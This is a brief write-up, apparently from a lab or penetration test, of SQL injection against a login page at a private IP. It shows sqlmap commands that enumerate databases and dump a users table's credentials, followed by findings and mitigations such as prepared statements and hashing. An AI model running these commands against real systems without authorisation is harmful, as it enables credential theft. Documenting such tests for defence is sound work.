# SQL Injection Exploitation with SQLMap

## Overview
SQL injection (SQLi) was exploited to **bypass authentication** and extract sensitive data from the web application's database.

## Commands Used
```bash
# Identify SQL injection vulnerability
sqlmap -u "http://192.168.1.100/login.php?user=admin" --dbs

# Extract database tables and columns
sqlmap -u "http://192.168.1.100/login.php?user=admin" -D users_db --tables

# Dump user credentials
sqlmap -u "http://192.168.1.100/login.php?user=admin" -D users_db -T users --dump

```
## Findings 
1. The login page was vulnerable to SQL injection.
2. User credentials were stored in plaintext, increasing security risk.
3. Lack of input validation allowed attackers to manipulate database queries.

## Mitigation Strategies
1. Implement prepared statements to prevent SQL injection.
2. Enforce input validation and sanitization for user inputs.
3. Restrict database user privileges to limit query execution scope.
4. Encrypt stored credentials using secure hashing (bcrypt, Argon2).
5. Deploy a Web Application Firewall (WAF) to detect and block SQL injection attempts.